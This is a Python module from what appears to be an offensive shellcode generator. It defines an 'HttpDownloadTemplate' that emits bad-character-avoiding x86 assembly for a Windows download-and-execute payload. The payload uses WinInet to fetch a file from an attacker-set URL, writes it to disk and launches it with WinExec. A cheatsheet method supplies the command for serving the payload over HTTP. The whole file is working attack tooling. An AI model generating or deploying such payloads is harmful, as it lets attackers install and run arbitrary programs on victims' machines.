"""HTTP download-and-run payload template via WinInet.

Uses InternetOpenA + InternetOpenUrlA + InternetReadFile to fetch a
resource from an HTTP server, write it to disk, and execute it.

No Winsock needed -- wininet.dll handles the full HTTP stack.

Template sequence:
  InternetOpenA -> InternetOpenUrlA -> VirtualAlloc ->
  InternetReadFile loop -> InternetCloseHandle (url) ->
  InternetCloseHandle (session) ->
  CreateFileA -> WriteFile -> CloseHandle -> WinExec(dst_path)

Required functions: LoadLibraryA, InternetOpenA, InternetOpenUrlA,
                    InternetReadFile, InternetCloseHandle,
                    VirtualAlloc, CreateFileA, WriteFile,
                    CloseHandle, WinExec
Required variables: inet_session, inet_url, virt_buf, file_handle,
                    bytes_read, bytes_total
Required strings:   url, dst_path, user_agent
"""
from __future__ import annotations

from ..encode import (
    encode_dword,
    safe_add_to_mem,
    safe_call_mem,
    safe_lea,
    safe_mem_load,
    safe_mem_store,
    safe_push_dword,
    safe_push_imm,
    safe_push_mem,
    safe_sub_from_mem,
)
from .base import PayloadTemplate, TemplateConfig

_DEFAULT_ALLOC = 0x100000


class HttpDownloadTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars
        alloc_size = config.alloc_size or _DEFAULT_ALLOC

        inet_open_off   = -layout.slot("InternetOpenA").offset
        inet_url_fn_off = -layout.slot("InternetOpenUrlA").offset
        inet_read_off   = -layout.slot("InternetReadFile").offset
        inet_close_off  = -layout.slot("InternetCloseHandle").offset
        valloc_off      = -layout.slot("VirtualAlloc").offset
        createfile_off  = -layout.slot("CreateFileA").offset
        writefile_off   = -layout.slot("WriteFile").offset
        closehdl_off    = -layout.slot("CloseHandle").offset
        winexec_off     = -layout.slot("WinExec").offset

        inet_sess_off   = -layout.slot("inet_session").offset
        inet_url_h_off  = -layout.slot("inet_url").offset
        virt_buf_off    = -layout.slot("virt_buf").offset
        file_h_off      = -layout.slot("file_handle").offset
        bytes_read_off  = -layout.slot("bytes_read").offset
        bytes_total_off = -layout.slot("bytes_total").offset

        ua_off  = -layout.slot("user_agent").offset
        url_off = -layout.slot("url").offset
        dst_off = -layout.slot("dst_path").offset

        return "\n".join([
            "; -- HTTP Download and Run Payload (WinInet) --",
            f"; URL: {config.url}",
            f"; Writes to: {config.dst_path}",
            "",
            "    ; InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT=1, NULL, NULL, 0)",
            "    xor  eax, eax",
            "    push eax                    ; dwFlags = 0",
            "    push eax                    ; lpszProxyBypass = NULL",
            "    push eax                    ; lpszProxy = NULL",
            *safe_push_imm(1, bc),
            "    ; dwAccessType = INTERNET_OPEN_TYPE_DIRECT",
            *safe_lea("eax", "ebp", ua_off, bc),
            "    push eax                    ; lpszAgent",
            *safe_call_mem("ebp", inet_open_off, bc),
            *safe_mem_store("ebp", inet_sess_off, "eax", bc),
            "",
            "    ; InternetOpenUrlA(hInternet, url, NULL, 0, 0, 0)",
            "    xor  eax, eax",
            "    push eax                    ; dwContext = 0",
            "    push eax                    ; dwFlags = 0",
            "    push eax                    ; dwHeadersLength = 0",
            "    push eax                    ; lpszHeaders = NULL",
            *safe_lea("eax", "ebp", url_off, bc),
            "    push eax                    ; lpszUrl",
            *safe_push_mem("ebp", inet_sess_off, bc),
            *safe_call_mem("ebp", inet_url_fn_off, bc),
            *safe_mem_store("ebp", inet_url_h_off, "eax", bc),
            "",
            f"    ; VirtualAlloc(NULL, 0x{alloc_size:x}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)",
            "    xor  eax, eax",
            *safe_push_imm(4, bc),
            "    ; PAGE_READWRITE",
            *safe_push_dword(0x3000, bc),
            "    ; MEM_COMMIT|MEM_RESERVE",
            *safe_push_dword(alloc_size, bc),
            "    ; dwSize",
            "    xor  eax, eax",
            "    push eax                    ; lpAddress = NULL",
            *safe_call_mem("ebp", valloc_off, bc),
            *safe_mem_store("ebp", virt_buf_off, "eax", bc),
            "",
            "    ; initialise bytes_total = 0",
            "    xor  eax, eax",
            *safe_mem_store("ebp", bytes_total_off, "eax", bc),
            "",
            "http_read_loop:",
            f"    ; remaining = 0x{alloc_size:x} - bytes_total",
            *encode_dword(alloc_size, bc, "ecx"),
            *safe_sub_from_mem("ecx", "ebp", bytes_total_off, bc),
            "    test ecx, ecx",
            "    jle  http_read_done          ; buffer full",
            *encode_dword(0x1000, bc, "edx"),
            "    cmp  ecx, edx",
            "    jle  http_read_sized",
            "    mov  ecx, edx               ; cap chunk at 4096",
            "http_read_sized:",
            "    push ecx                     ; save chunk size",
            "",
            "    ; buf ptr = virt_buf + bytes_total",
            *safe_mem_load("eax", "ebp", virt_buf_off, bc),
            *_safe_add_from_mem("eax", "ebp", bytes_total_off, bc),
            "",
            "    ; InternetReadFile(hUrl, buf, chunk_size, &bytes_read)",
            "    pop  ecx                     ; restore chunk size",
            *safe_lea("edx", "ebp", bytes_read_off, bc),
            "    push edx                    ; lpdwNumberOfBytesRead",
            "    push ecx                    ; dwNumberOfBytesToRead",
            "    push eax                    ; lpBuffer",
            *safe_push_mem("ebp", inet_url_h_off, bc),
            *safe_call_mem("ebp", inet_read_off, bc),
            "",
            "    ; check return value (BOOL): 0 = failure",
            "    test eax, eax",
            "    jz   http_read_done",
            "",
            "    ; check bytes_read: 0 means EOF",
            *safe_mem_load("eax", "ebp", bytes_read_off, bc),
            "    test eax, eax",
            "    jz   http_read_done",
            *safe_add_to_mem("ebp", bytes_total_off, "eax", bc),
            "    jmp  http_read_loop",
            "",
            "http_read_done:",
            "    ; InternetCloseHandle(hUrl)",
            *safe_push_mem("ebp", inet_url_h_off, bc),
            *safe_call_mem("ebp", inet_close_off, bc),
            "",
            "    ; InternetCloseHandle(hSession)",
            *safe_push_mem("ebp", inet_sess_off, bc),
            *safe_call_mem("ebp", inet_close_off, bc),
            "",
            "    ; CreateFileA(dst_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,",
            "    ;             FILE_ATTRIBUTE_NORMAL, NULL)",
            "    xor  ebx, ebx",
            "    push ebx                    ; hTemplateFile = NULL",
            *safe_push_dword(0x80, bc),
            "    ; FILE_ATTRIBUTE_NORMAL",
            *safe_push_imm(2, bc),
            "    ; CREATE_ALWAYS",
            "    push ebx                    ; lpSecurityAttributes = NULL",
            "    push ebx                    ; dwShareMode = 0",
            *_emit_generic_write(bc),
            "    ; GENERIC_WRITE = 0x40000000",
            *safe_lea("eax", "ebp", dst_off, bc),
            "    push eax                    ; lpFileName",
            *safe_call_mem("ebp", createfile_off, bc),
            *safe_mem_store("ebp", file_h_off, "eax", bc),
            "",
            "    ; WriteFile(file_handle, virt_buf, bytes_total,",
            "    ;           &bytes_read /* scratch */, NULL)",
            "    xor  eax, eax",
            "    push eax                    ; lpOverlapped = NULL",
            *safe_lea("eax", "ebp", bytes_read_off, bc),
            "    push eax                    ; lpNumberOfBytesWritten",
            *safe_push_mem("ebp", bytes_total_off, bc),
            *safe_push_mem("ebp", virt_buf_off, bc),
            *safe_push_mem("ebp", file_h_off, bc),
            *safe_call_mem("ebp", writefile_off, bc),
            "",
            "    ; CloseHandle(file_handle)",
            *safe_push_mem("ebp", file_h_off, bc),
            *safe_call_mem("ebp", closehdl_off, bc),
            "",
            "    ; WinExec(dst_path, SW_SHOWNORMAL)",
            *safe_lea("eax", "ebp", dst_off, bc),
            *safe_push_imm(1, bc),
            "    push eax",
            *safe_call_mem("ebp", winexec_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        url = config.url or ""
        host = config.lhost
        port = config.lport
        if url:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            if parsed.hostname:
                host = parsed.hostname
            if parsed.port:
                port = parsed.port
        return [
            ("Serve file via HTTP",
             f"python3 -m http.server {port} --bind {host}"),
            ("URL fetched", url),
            ("File written to", config.dst_path or ""),
        ]


def _safe_add_from_mem(
    dst: str, base: str, offset: int, bc: set[int],
) -> list[str]:
    from ..encode import safe_mem_load
    lines = safe_mem_load("ecx", base, offset, bc)
    lines.append(f"    add  {dst}, ecx")
    return lines


def _emit_generic_write(badchars: set[int]) -> list[str]:
    if 0x40 not in badchars:
        return [
            "    xor  eax, eax",
            "    mov  al, 0x40",
            "    shl  eax, 24               ; GENERIC_WRITE = 0x40000000",
            "    push eax",
        ]
    lines = encode_dword(0x40000000, badchars, "eax")
    lines.append("    push eax")
    return lines
